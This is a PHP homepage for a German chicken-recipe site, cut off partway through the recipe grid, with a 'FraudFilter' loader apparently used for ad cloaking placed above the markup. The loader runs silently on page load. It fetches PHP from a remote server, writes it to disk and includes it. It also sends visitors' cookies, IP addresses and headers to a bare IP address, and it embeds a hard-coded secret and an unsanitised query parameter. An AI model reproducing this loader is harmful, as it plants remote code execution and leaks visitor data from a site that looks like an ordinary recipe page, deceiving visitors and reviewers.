<?php

/**
 * Fraudfilter PHP Paste & WordPress Integration Code
 *
 * Version: 1.0.1
 * Author: Alex Shelznyev
 *
 * Minimum Supported Version: PHP 7.4
 * Preferred Versions: PHP 8.0, 8.1, 8.2, 8.3
 * 
 * ADVANCED
 * Verification code for WordPress Plugin: Yfs^3X4AgVEzT&
 */
error_reporting(0);

class FraudFilterWordPressLoader_sd6p2 {
    private $clid;
    private $campaignSecret;
    private $host;
    private $integrationType;

    public function __construct() {
        $this->clid = 'sd6p2';
        $this->campaignSecret = '6fcda9d7-0e01-467d-9a91-c78a1824c19c';
        $this->host = 'api.fraudfilter.io';
        $this->integrationType = 'EMBED';
    }

    public function run() {
        $fileName = $this->getFileName();

        $GLOBALS['fbIncludedFileName'] = $fileName;
        $GLOBALS['fbIncludedHomeDir'] = dirname($fileName);

        if (isset($_GET['ff17x_sign'], $_GET['ff17x_time'], $_GET['ff17x_mode'])) {
            $this->handleRequest($fileName);
        }

        if (file_exists($fileName)) {
            include($fileName);
        }
    }

    private function getFileName() {
        static $fileName = null;
        if ($fileName === null) {
            $wpmode = function_exists('wp_upload_dir');
            $home = $wpmode ? wp_upload_dir()['basedir'] : __DIR__;
            $fileName = $home . DIRECTORY_SEPARATOR . $this->clid . '.include.php';
        }
        return $fileName;
    }

    private function handleRequest($fileName) {
        if (!file_exists($fileName) || in_array($_GET['ff17x_mode'], ['diagnostics', 'upgrade'], true)) {
            if ($this->isSignatureValidTemp($_GET['ff17x_sign'], $_GET['ff17x_time'])) {
                try {
                    error_reporting(E_ALL);
                    $diagnosticsResult = $this->performDiagnosticsWP($fileName);
                    if (!$diagnosticsResult['success']) {
                        echo json_encode($diagnosticsResult);
                    } elseif ($_GET['ff17x_mode'] !== 'diagnostics' || !file_exists($fileName)) {
                        $this->downloadScriptFirstTime($fileName);
                    } else {
                        echo json_encode($diagnosticsResult);
                    }
                } catch (Exception $e) {
                    echo json_encode(['success' => false, 'errors' => [$e->getMessage()], 'version' => 4]);
                }
                exit;
            }
        }
    }

    private function isSignatureValidTemp($sign, $time) {
        return hash_equals(sha1($this->campaignSecret . '.' . $this->clid . '.' . $time), $sign);
    }

    private function getUpgradeScriptViaContentsWP() {
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'header' => 'x-ff-secret: ' . $this->campaignSecret,
                'timeout' => 2
            ]
        ]);
        return @file_get_contents($this->getFileNameForUpdatesWP("contents"), false, $context);
    }

    private function getFileNameForUpdatesWP($type) {
        return "https://{$this->host}/v1/integration/get-updates?clid={$this->clid}&integrationType={$this->integrationType}&type=$type";
    }

    private function isSignature2ValidTemp($content) {
        return strpos($content, '@FraudFilter.io 20') !== false;
    }

    private function downloadScriptFirstTime($fileName) {
        $output = $this->getUpgradeScriptViaContentsWP();

        if ($output === false || !$this->isSignature2ValidTemp($output)) {
            $output = $this->fetchViaCurl();
        }

        if ($this->writeFile($fileName, $output)) {
            echo json_encode(['success' => true, 'phpversion' => PHP_VERSION, 'version' => 5]);
        } else {
            echo json_encode(['success' => false, 'version' => 5, 'errorMessage' => "Unable to write to file: $fileName. Please check permissions for folder: " . dirname($fileName)]);
        }
    }

    private function fetchViaCurl() {
        if (!function_exists('curl_init')) {
            throw new Exception('cURL is not available on this server.');
        }

        $ch = curl_init($this->getFileNameForUpdatesWP("curl"));
        curl_setopt_array($ch, [
            CURLOPT_HTTPHEADER => ['x-ff-secret: ' . $this->campaignSecret],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
        ]);
        $output = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            throw new Exception("cURL Error: $error");
        }

        if (!$this->isSignature2ValidTemp($output)) {
            throw new Exception("Malformed answer received from the server.");
        }
        return $output;
    }

    private function writeFile($fileName, $content) {
        return file_put_contents($fileName, $content, LOCK_EX) !== false;
    }

    function hasPermissionsIssuesWP($home, $fileName) {
        ob_start();
        $tempFileName = $fileName.'.tempfile';
        $tempFile = fopen($tempFileName, 'w');
        if ( !$tempFile ) {
            ob_end_clean();
            return array('code' => 'WRITE_PERMISSION','args' => array($tempFileName, $home));
        } else {
            ob_end_clean();
            $meta_data = stream_get_meta_data($tempFile);
            $fullfilename = $meta_data["uri"];
            fclose($tempFile);
            return unlink($tempFileName) ? "" : array('code' => 'UNABLE_TO_DELETE_TEMP_FILE','args' => array($tempFileName, $home));
        }
    }

    function performDiagnosticsWP($fileName) {
        header("X-FF: true");
        $errors = array();
        $extErrors = array();
        $success = true;
        $home = dirname($fileName);

        $permissionsIssues = $this->hasPermissionsIssuesWP($home, $fileName);
        if ($permissionsIssues) {
            $extErrors[] = $permissionsIssues;
            $success = false;
        }
        $serverConnectionIssues = $this->getCurlConnectionIssuesWP();
        $contentsConnectionIssues = $this->getContentsConnectionIssuesWP();
        $result = array('success' => $success, 'diagnostics' => true, 'extErrors' => $extErrors, 'errors' => $errors, 'version' => 5, 'phpversion' => PHP_VERSION, 'connection' => $serverConnectionIssues, 'contentsConnection' => $contentsConnectionIssues);
        return $result;
    }

    function getCurlConnectionIssuesWP() {
        return $this->sendRequestAndGetResultCurlWP2(true);
    }

    function getContentsConnectionIssuesWP() {
        return $this->sendRequestAndGetResultFileGetContentsWP2(true);
    }

        function sendRequestAndGetResultWP2($diagnostics) {
        return $this->sendRequestAndGetResultCurlWP2($diagnostics);
    }

    function sendRequestAndGetResultCurlWP2($diagnostics) {
        $resultObj = new stdClass();
        $resultObj->result = false;

        if ($diagnostics && !function_exists('curl_init')) {
            $resultObj->curlAnswerType = "NO_CURL";
            return $resultObj;
        }

        $url = "http://130.211.20.155/sd6p2";
        $nParam = 'a1edfn';
        if (isset($_GET[$nParam])) {
            $url .= '&' . $nParam . '=' . $_GET[$nParam];
        }
        if ($diagnostics) {
            $url .= "?diagnostics=true";
        }

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => 1,
            CURLOPT_HTTPHEADER => $this->fillAllPostHeaders(),
            CURLOPT_DNS_CACHE_TIMEOUT => 120,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_TCP_NODELAY => 1,
        ]);

        $output = curl_exec($ch);
        $curl_error_number = curl_errno($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $output = trim($output);

        if ($diagnostics) {
            $resultObj->curlAnswerType = "CURL_ANSWER";
            $resultObj->output = $output;
            $resultObj->httpCode = $http_status;
            $resultObj->curlErrorNumber = $curl_error_number;
        } elseif ($output === '' || strlen($output) <= 3) {
            $this->notifyAboutError("ANSWER_ERROR_curl_error_number_" . $curl_error_number . '_output' . $output . '_http_status_' . $http_status);
        } else {
            $this->processOutput($resultObj, $output, $curl_error_number, $http_status);
        }

        curl_close($ch);
        return $resultObj;
    }

    function sendRequestAndGetResultFileGetContentsWP2($diagnostics) {
        $time_start = microtime(true);
        $resultObj = new stdClass();
        $resultObj->result = false;

        $url = "http://130.211.20.155/sd6p2";
        $nParam = 'a1edfn';
        if (isset($_GET[$nParam])) {
            $url .= '&' . $nParam . '=' . $_GET[$nParam];
        }
        if ($diagnostics) {
            $url .= "?diagnostics=true";
        }

        $context = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => $this->getHeadersAsOneString($this->fillAllPostHeaders()),
                'timeout' => 2,
                'ignore_errors' => true
            ]
        ]);

        $output = file_get_contents($url, false, $context);
        $output = trim($output);

        if ($diagnostics) {
            $resultObj->curlAnswerType = "CONTENTS_ANSWER";
            $resultObj->output = $output;
        } elseif ($output === '' || strlen($output) <= 3) {
            $this->notifyAboutError("ANSWER_ERROR_contents_diff=" . (microtime(true) - $time_start) . '_output=' . $output);
        } else {
            $this->processOutput($resultObj, $output, null, null);
        }

        return $resultObj;
    }

    private function processOutput(&$resultObj, $output, $curl_error_number = null, $http_status = null) {
        $result = $output[0];
        $sep = $output[1];
        if ($result != '0' && $result != '1' || $sep != ';') {
            $this->notifyAboutError("INVALID_PREFIX" . ($curl_error_number ? "_curl_error_number_$curl_error_number" : "") . '_output' . $output . ($http_status ? "_http_status_$http_status" : ""));
        }
        $resultObj->type = substr($output, 2, 1);
        $resultObj->url = substr($output, 4);
        $resultObj->result = ($result === '1') ? 1 : (($output === '0') ? 0 : false);
    }

    function getHeadersAsOneString($headers) {
        $endline = "\n";
        return implode($endline, $headers) . $endline;
    }

    function fillAllPostHeaders() {
        $headers = [
            'content-length: 0',
            'X-FF-P: 6fcda9d7-0e01-467d-9a91-c78a1824c19c'
        ];

        $headerMappings = [
            'X-FF-REMOTE-ADDR' => 'REMOTE_ADDR',
            'X-FF-X-FORWARDED-FOR' => 'HTTP_X_FORWARDED_FOR',
            'X-FF-X-REAL-IP' => 'HTTP_X_REAL_IP',
            'X-FF-DEVICE-STOCK-UA' => 'HTTP_DEVICE_STOCK_UA',
            'X-FF-X-OPERAMINI-PHONE-UA' => 'HTTP_X_OPERAMINI_PHONE_UA',
            'X-FF-HEROKU-APP-DIR' => 'HEROKU_APP_DIR',
            'X-FF-X-FB-HTTP-ENGINE' => 'X_FB_HTTP_ENGINE',
            'X-FF-X-PURPOSE' => 'X_PURPOSE',
            'X-FF-REQUEST-SCHEME' => 'REQUEST_SCHEME',
            'X-FF-CONTEXT-DOCUMENT-ROOT' => 'CONTEXT_DOCUMENT_ROOT',
            'X-FF-SCRIPT-FILENAME' => 'SCRIPT_FILENAME',
            'X-FF-REQUEST-URI' => 'REQUEST_URI',
            'X-FF-SCRIPT-NAME' => 'SCRIPT_NAME',
            'X-FF-PHP-SELF' => 'PHP_SELF',
            'X-FF-REQUEST-TIME-FLOAT' => 'REQUEST_TIME_FLOAT',
            'X-FF-COOKIE' => 'HTTP_COOKIE',
            'X-FF-ACCEPT-ENCODING' => 'HTTP_ACCEPT_ENCODING',
            'X-FF-ACCEPT-LANGUAGE' => 'HTTP_ACCEPT_LANGUAGE',
            'X-FF-CF-CONNECTING-IP' => 'HTTP_CF_CONNECTING_IP',
            'X-FF-INCAP-CLIENT-IP' => 'HTTP_INCAP_CLIENT_IP',
            'X-FF-QUERY-STRING' => 'QUERY_STRING',
            'X-FF-X-FORWARDED-FOR' => 'X_FORWARDED_FOR',
            'X-FF-ACCEPT' => 'HTTP_ACCEPT',
            'X-FF-X-WAP-PROFILE' => 'X_WAP_PROFILE',
            'X-FF-PROFILE' => 'PROFILE',
            'X-FF-WAP-PROFILE' => 'WAP_PROFILE',
            'X-FF-REFERER' => 'HTTP_REFERER',
            'X-FF-HOST' => 'HTTP_HOST',
            'X-FF-VIA' => 'HTTP_VIA',
            'X-FF-CONNECTION' => 'HTTP_CONNECTION',
            'X-FF-X-REQUESTED-WITH' => 'HTTP_X_REQUESTED_WITH',
            'User-Agent' => 'HTTP_USER_AGENT',
            'Expected' => ''
        ];

        foreach ($headerMappings as $out => $in) {
            $this->addHeader($headers, $out, $in);
        }

        $hh = $this->getallheadersFF();
        foreach ($hh as $key => $value) {
            if (strtolower($key) === 'host') {
                $headers[] = 'X-FF-HOST-ORDER: ' . array_search($key, array_keys($hh));
                break;
            }
        }

        return $headers;
    }

    function getallheadersFF() {
        $headers = array();
        foreach ( $_SERVER as $name => $value ) {
            if ( substr( $name, 0, 5 ) == 'HTTP_' ) {
                $headers[ str_replace( ' ', '-', ucwords( strtolower( str_replace( '_', ' ', substr( $name, 5 ) ) ) ) ) ] = $value;
            }
        }
        return $headers;
    }

    function addHeader(& $headers, $out, $in) {
        if (!isset( $_SERVER[$in] )) {
            return;
        }
        $value = $_SERVER[$in];
        if (is_array($value)) {
            $value = implode(',', $value);
        }
        $headers[] = $out.': '.$value;
    }

    function setError($resultObj, $code, $param1 = null, $param2 = null, $param3 = null) {
        $resultObj->errorCode = $code;
        $resultObj->error = $code;
        if ($param1 != null) {
            $resultObj->$param1 = $param1;
        }
        if ($param2 != null) {
            $resultObj->$param2 = $param2;
        }
        if ($param3 != null) {
            $resultObj->$param3 = $param3;
        }
        return $resultObj;
    }

    function notifyAboutError($message) {
        $len = strlen($message);
        if ($len > 800) {
            $message = substr($message, 0, 800);
        }
        $message = urlencode($message);

        $url = 'http://log.fraudfilter.io/ff-php?v=ff1&guid=sd6p2&m='.$message;
        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);

        $output = curl_exec($ch);
    }

}

$fraudFilterWordPressLoader_sd6p2 = new FraudFilterWordPressLoader_sd6p2();
$fraudFilterWordPressLoader_sd6p2->run();

// @FraudFilter.io
?>

<!DOCTYPE html>
<html lang="de" data-lang="de" data-url-de="./" data-url-en="en/" data-url-fr="fr/">
<head>
<meta charset="UTF-8">
  <!-- Web-Stat tracking code -->
<script async src="https://app.ardalio.com/wts7.js" data-wts-alias="2230271" data-wts-db="1"></script>
<!-- End Web-Stat tracking code -->
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Chick Delights | Hähnchenrezepte, keine Lebensgeschichten</title>
<meta name="description" content="Neun Hähnchenrezepte, jedes dreimal getestet. Grammgenaue Zutaten, skalierbare Portionen und Methoden für eine echte Alltagsküche.">
<meta name="theme-color" content="#1e3b2a">
<meta name="robots" content="index, follow, max-image-preview:large">
<link rel="canonical" href="https://chickdelights.site/">
<link rel="alternate" hreflang="de" href="https://chickdelights.site/">
<link rel="alternate" hreflang="en" href="https://chickdelights.site/en/">
<link rel="alternate" hreflang="fr" href="https://chickdelights.site/fr/">
<link rel="alternate" hreflang="x-default" href="https://chickdelights.site/">

<meta property="og:type" content="website">
<meta property="og:site_name" content="Chick Delights">
<meta property="og:locale" content="de_DE">
<meta property="og:locale:alternate" content="en_GB">
<meta property="og:locale:alternate" content="fr_FR">

<meta property="og:title" content="Chick Delights | Hähnchenrezepte, keine Lebensgeschichten">
<meta property="og:description" content="Neun Hähnchenrezepte, jedes dreimal getestet. Grammgenaue Zutaten, skalierbare Portionen und Methoden für eine echte Alltagsküche.">
<meta property="og:url" content="https://chickdelights.site/">
<meta property="og:image" content="https://chickdelights.site/img/hero.jpg">
<meta name="twitter:card" content="summary_large_image">
<link rel="icon" href="img/favicon.svg" type="image/svg+xml">
<link rel="preload" href="assets/fonts/fraunces-normal-latin.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="assets/fonts/manrope-normal-latin.woff2" as="font" type="font/woff2" crossorigin>
<link rel="stylesheet" href="assets/css/style.css">
<script src="assets/js/lang.js"></script>

</head>
<body>
<a class="skip-link" href="#main">Zum Inhalt springen</a>

<div class="ribbon">
  <span class="ribbon-tag">Neu</span>
  <span>Der 7-Tage-Hähnchenplan ist gratis zum Newsletter</span>
  <a href="./#newsletter">Plan holen</a>
</div>

<header class="site-header" id="top">
  <div class="container header-inner">
    <a class="brand" href="./">
      <span class="brand-mark" aria-hidden="true">
        <svg viewBox="0 0 48 48" width="27" height="27" fill="currentColor" aria-hidden="true">
          <circle cx="16" cy="13" r="5.2"/>
          <circle cx="24" cy="9.5" r="5.8"/>
          <circle cx="32" cy="13" r="5.2"/>
          <circle cx="25.5" cy="27" r="14.5"/>
          <path d="M39 24 48 27.5 39 32Z"/>
          <path d="M36 34.5c3.2.4 5 3 4 6.3-3.2-.7-5.2-3.1-4-6.3Z"/>
          <circle cx="32" cy="24" r="2.6" fill="#1e3b2a"/>
          <circle cx="32.8" cy="23.3" r=".9" fill="#fffaf0"/>
        </svg>
      </span>
      <span class="brand-text">
        <strong>Chick Delights</strong>
        <small>Getestet, nie gehetzt</small>
      </span>
    </a>

    <nav class="nav" id="mainNav" aria-label="Hauptnavigation">
      <a href="./#recipes" >Rezepte</a>
      <a href="./#categories">Kategorien</a>
      <a href="kitchen-basics.php" >Küchenwissen</a>
      <a href="about.php" >Über uns</a>
      <a href="impressum.php" >Impressum</a>
    </nav>

    <div class="header-actions">
      <nav class="lang-switch" aria-label="Sprache">
        <a href="./" hreflang="de" lang="de" data-lang-link="de" title="Deutsch" aria-current="true">DE</a>
        <a href="en/" hreflang="en" lang="en" data-lang-link="en" title="English">EN</a>
        <a href="fr/" hreflang="fr" lang="fr" data-lang-link="fr" title="Français">FR</a>
      </nav>
      <a class="btn btn-primary btn-sm hide-sm" href="./#recipes">Rezepte ansehen</a>
      <button class="icon-btn" id="savedBtn" type="button" aria-label="Gespeicherte Rezepte öffnen">
        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
          <path d="M12 20.4S4 15.3 4 9.8A4.4 4.4 0 0 1 12 7a4.4 4.4 0 0 1 8 2.8c0 5.5-8 10.6-8 10.6Z"/>
        </svg>
        <span class="saved-count" id="savedCount" aria-hidden="true" hidden>0</span>
      </button>
      <button class="icon-btn menu-btn" id="menuBtn" type="button" aria-label="Menü" aria-expanded="false" aria-controls="mainNav">
        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" aria-hidden="true">
          <path d="M3 6h18M3 12h18M3 18h18"/>
        </svg>
      </button>
    </div>
  </div>
</header>

<main id="main">
  <section class="hero">
    <div class="container hero-grid">
      <div class="hero-copy">
        <span class="hero-eyebrow"><i aria-hidden="true"></i>Dreimal getestet, bevor es erscheint</span>
        <h1>H&auml;hnchen, richtig gemacht &mdash; <em>jedes Mal.</em></h1>
        <p class="hero-sub">Neun Rezepte, grammgenaue Zutaten und eine Methode, der du mit einer Hand folgen kannst, w&auml;hrend die Pfanne hei&szlig; wird. Keine 40 Abs&auml;tze Lebensgeschichte vor dem Essen.</p>
        <div class="hero-actions">
          <a class="btn btn-primary" href="#recipes">Rezepte ansehen <span aria-hidden="true">&#8594;</span></a>
          <a class="btn btn-ghost" href="sticky-chicken.php">Rezept der Woche</a>
        </div>
        <dl class="hero-stats">
          <div><dt>9</dt><dd>Getestete Rezepte</dd></div>
          <div><dt>4,8</dt><dd>Leserbewertung</dd></div>
          <div><dt>15 Min.</dt><dd>Schnellstes Abendessen</dd></div>
        </dl>
      </div>

      <div class="hero-art">
        <div class="hero-photo">
          <img src="img/hero.jpg" alt="Gebratene H&auml;hnchenst&uuml;cke mit Reis" width="700" height="700" fetchpriority="high">
        </div>
        <div class="hero-card">
          <img src="img/spotlight.jpg" alt="" width="48" height="48">
          <div>
            <span class="hero-card-kicker">Rezept der Woche</span>
            <strong>Klebriges Ingwer-H&auml;hnchen</strong>
            <span>35 Min. &bull; 4 Portionen</span>
          </div>
        </div>
        <span class="hero-stamp" aria-hidden="true"><b>3&times;</b><span>&#9733;&#9733;&#9733;&#9733;&#9733;</span></span>
      </div>
    </div>
  </section>

  <div class="strip" aria-hidden="true">
    <span>Dreifach getestet</span><i>&#10022;</i>
    <span>Grammgenau</span><i>&#10022;</i>
    <span>Portionen skalierbar</span><i>&#10022;</i>
    <span>Keine Lebensgeschichten</span>
  </div>

  <section class="section section-cream" id="categories">
    <div class="container">
      <div class="section-head center">
        <span class="section-index" aria-hidden="true">01</span>
        <span class="kicker">Nach Stil st&ouml;bern</span>
        <h2>Was kochst du heute Abend?</h2>
        <p>Sechs Wege ins Archiv &mdash; nimm den, der zu deiner Pfanne passt.</p>
      </div>
      <div class="categories" id="categoriesGrid">
        <button class="cat" type="button" data-filter="crispy"><span class="cat-thumb"><img src="img/r1.jpg" alt="" loading="lazy" width="220" height="220"></span><span>Knusprig</span></button>
        <button class="cat" type="button" data-filter="grilled"><span class="cat-thumb"><img src="img/r3.jpg" alt="" loading="lazy" width="220" height="220"></span><span>Gegrillt</span></button>
        <button class="cat" type="button" data-filter="skewers"><span class="cat-thumb"><img src="img/r4.jpg" alt="" loading="lazy" width="220" height="220"></span><span>Spieße</span></button>
        <button class="cat" type="button" data-filter="curry"><span class="cat-thumb"><img src="img/r5.jpg" alt="" loading="lazy" width="220" height="220"></span><span>Curry</span></button>
        <button class="cat" type="button" data-filter="sticky"><span class="cat-thumb"><img src="img/r7.jpg" alt="" loading="lazy" width="220" height="220"></span><span>Klebrig &amp; Wings</span></button>
        <button class="cat" type="button" data-filter="rice"><span class="cat-thumb"><img src="img/r8.jpg" alt="" loading="lazy" width="220" height="220"></span><span>Reisschüsseln</span></button>
      </div>
    </div>
  </section>

  <section class="section section-white" id="recipes">
    <div class="container">
      <div class="section-head split">
        <div>
          <span class="section-index" aria-hidden="true">02</span>
          <span class="kicker">Das Archiv</span>
          <h2>Alle H&auml;hnchenrezepte</h2>
          <p>Jedes Rezept wird mindestens dreimal gekocht, bevor es online geht.</p>
        </div>
        <p class="muted-note">9 Rezepte &bull; aktualisiert Oktober 2026</p>
      </div>

      <div class="toolbar">
        <div class="chips" id="chips">
          <button class="chip is-active" type="button" data-filter="all" aria-pressed="true">Alle</button>
          <button class="chip" type="button" data-filter="crispy" aria-pressed="false">Knusprig</button>
          <button class="chip" type="button" data-filter="grilled" aria-pressed="false">Gegrillt</button>
          <button class="chip" type="button" data-filter="skewers" aria-pressed="false">Spie&szlig;e</button>
          <button class="chip" type="button" data-filter="curry" aria-pressed="false">Curry</button>
          <button class="chip" type="button" data-filter="sticky" aria-pressed="false">Klebrig</button>
          <button class="chip" type="button" data-filter="rice" aria-pressed="false">Reis</button>
        </div>
        <form class="search" role="search" action="./#recipes">
          <label class="sr-only" for="searchInput">Rezepte suchen</label>
          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m16 16 5 5"/></svg>
          <input id="searchInput" type="search" placeholder="Rezepte suchen, z. B. Katsu" autocomplete="off">
        </form>
      </div>

      <div class="recipe-grid" id="recipeGrid">
<article class="card" data-cat="crispy" data-search="knuspriges hähnchen-karaage knusprig crispy karaage ist japanisch frittiertes hähnchen mit einer panade, die so leicht ist, dass sie fast knistert. drei dinge machen es aus: kartoffelstärke statt mehl, ein zweites frittieren bei höherer temperatur und eine pfanne, die nie zu voll ist.">
            <div class="card-media">
              <img src="img/r1.jpg" alt="Knuspriges Hähnchen-Karaage" loading="lazy" width="700" height="700">
              <span class="badge quick">Leserliebling</span>
              <button class="save-btn" type="button" data-save="crispy-chicken-karaage" aria-pressed="false" aria-label="Knuspriges Hähnchen-Karaage speichern">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20.4S4 15.3 4 9.8A4.4 4.4 0 0 1 12 7a4.4 4.4 0 0 1 8 2.8c0 5.5-8 10.6-8 10.6Z"/></svg>
              </button>
            </div>
            <div class="card-body">
              <span class="card-cat">Knusprig</span>
              <h3><a href="crispy-chicken-karaage.php">Knuspriges Hähnchen-Karaage</a></h3>
              <div class="card-meta">
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>25 Min.</span>
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 20v-1.5a4.5 4.5 0 0 0-4.5-4.5h-3A4.5 4.5 0 0 0 4 18.5V20"/><circle cx="10" cy="8" r="3.5"/></svg>4 Portionen</span>
              </div>
              <div class="card-foot">
                <span class="rating"><span class="stars" aria-hidden="true">&#9733;&#9733;&#9733;&#9733;&#9733;</span><strong>4,9</strong><span>(214)</span></span>
                <a class="card-link" href="crispy-chicken-karaage.php">Rezept ansehen <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
              </div>
            </div>
          </article>
<article class="card" data-cat="crispy" data-search="buttermilch-fried-chicken knusprig crispy buttermilch hat zwei aufgaben: sie macht das fleisch zart und lässt das mehl in unregelmäßigen graten haften. mit einem heißen honig-chili-filet ist das das einzige fried-chicken-rezept, das du brauchst.">
            <div class="card-media">
              <img src="img/r2.jpg" alt="Buttermilch-Fried-Chicken" loading="lazy" width="700" height="700">
              <span class="badge hot">Wochenend-Tipp</span>
              <button class="save-btn" type="button" data-save="buttermilk-fried-chicken" aria-pressed="false" aria-label="Buttermilch-Fried-Chicken speichern">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20.4S4 15.3 4 9.8A4.4 4.4 0 0 1 12 7a4.4 4.4 0 0 1 8 2.8c0 5.5-8 10.6-8 10.6Z"/></svg>
              </button>
            </div>
            <div class="card-body">
              <span class="card-cat">Knusprig</span>
              <h3><a href="buttermilk-fried-chicken.php">Buttermilch-Fried-Chicken</a></h3>
              <div class="card-meta">
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>45 Min.</span>
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 20v-1.5a4.5 4.5 0 0 0-4.5-4.5h-3A4.5 4.5 0 0 0 4 18.5V20"/><circle cx="10" cy="8" r="3.5"/></svg>4 Portionen</span>
              </div>
              <div class="card-foot">
                <span class="rating"><span class="stars" aria-hidden="true">&#9733;&#9733;&#9733;&#9733;&#9733;</span><strong>4,8</strong><span>(486)</span></span>
                <a class="card-link" href="buttermilk-fried-chicken.php">Rezept ansehen <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
              </div>
            </div>
          </article>
<article class="card" data-cat="grilled" data-search="tandoori-hähnchen vom blech gegrillt grilled ein echter tandoor erreicht 480 °c — das schafft kein haushaltsbackofen. die lösung ist einfach: das hähnchen auf einem heißen blech durchgaren und dann unter dem grill für die röstaromen fertigstellen.">
            <div class="card-media">
              <img src="img/r3.jpg" alt="Tandoori-Hähnchen vom Blech" loading="lazy" width="700" height="700">
              <span class="badge quick">Eiweißreich</span>
              <button class="save-btn" type="button" data-save="tandoori-chicken" aria-pressed="false" aria-label="Tandoori-Hähnchen vom Blech speichern">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20.4S4 15.3 4 9.8A4.4 4.4 0 0 1 12 7a4.4 4.4 0 0 1 8 2.8c0 5.5-8 10.6-8 10.6Z"/></svg>
              </button>
            </div>
            <div class="card-body">
              <span class="card-cat">Gegrillt</span>
              <h3><a href="tandoori-chicken.php">Tandoori-Hähnchen vom Blech</a></h3>
              <div class="card-meta">
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>40 Min.</span>
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 20v-1.5a4.5 4.5 0 0 0-4.5-4.5h-3A4.5 4.5 0 0 0 4 18.5V20"/><circle cx="10" cy="8" r="3.5"/></svg>4 Portionen</span>
              </div>
              <div class="card-foot">
                <span class="rating"><span class="stars" aria-hidden="true">&#9733;&#9733;&#9733;&#9733;&#9733;</span><strong>4,9</strong><span>(342)</span></span>
                <a class="card-link" href="tandoori-chicken.php">Rezept ansehen <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
              </div>
            </div>
          </article>
<article class="card" data-cat="skewers" data-search="rauchige hähnchenspieße spieße skewers joghurt ist der stille held beim gegrillten hähnchen. er haftet am fleisch, trägt die gewürze und schützt die oberfläche davor, über direkter hitze auszutrocknen.">
            <div class="card-media">
              <img src="img/r4.jpg" alt="Rauchige Hähnchenspieße" loading="lazy" width="700" height="700">
              <span class="badge ">Grillabend</span>
              <button class="save-btn" type="button" data-save="smoky-chicken-skewers" aria-pressed="false" aria-label="Rauchige Hähnchenspieße speichern">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20.4S4 15.3 4 9.8A4.4 4.4 0 0 1 12 7a4.4 4.4 0 0 1 8 2.8c0 5.5-8 10.6-8 10.6Z"/></svg>
              </button>
            </div>
            <div class="card-body">
              <span class="card-cat">Spieße</span>
              <h3><a href="smoky-chicken-skewers.php">Rauchige Hähnchenspieße</a></h3>
              <div class="card-meta">
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>30 Min.</span>
                <span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 20v-1.5a4.5 4.5 0 0 0-4.5-4.5h-3A4.5 4.5 0 0 0 4 18.5V20"/><circle cx="10" cy="8" r="3.5"/></svg>4 Portionen</span>
              </div>
              <div class="card-foot">
                <span class="rating"><span class="stars" aria-hidden="true">&#9733;&#9733;&#9733;&#9733;&#9733;</span><strong>4,8</strong><span>(168)</span></span>
                <a class="card-link" href="smoky-chicken-skewers.php">Rezept ansehen <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
              </div>
            </div>
          </article>
<article class="card" data-cat="curry" data-search="hähnchen-katsu-curry curry curry katsu curry sind zwei rezepte in einem: ein knusprig paniertes schnitzel und eine seidige, mild gewürzte sauce. zuerst die sauce kochen und warm halten, dann das hähnchen braten, damit es auf den teller kommt, solange die kruste noch laut ist.">
            <div class="card-media">
              <img src="img/r5.jpg" alt="Hähnchen-Katsu-Curry" loading="lazy" width="700" height="700">
              <span class="badge ">Familienfavorit</span>
              <button class="save-btn" type="button" data-save="chicken-katsu-curry" aria-pressed="false" aria-label="Hähnchen-Katsu-Curry speichern">
                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 20.4S4 15.3 4 9.8A4.4 4.4 0 0 1 12 7a4.4 4.4 0 0 1 8 2.8c0 5.5-8 10.6-8 10.6Z"/></svg>
              </button>
            </div>
            <div class="card-body">
              <span class="card-cat">Curry</span>
              <h3><a href="chicken-katsu-curry.php">Hähnchen-Katsu-Curry</a></h3>
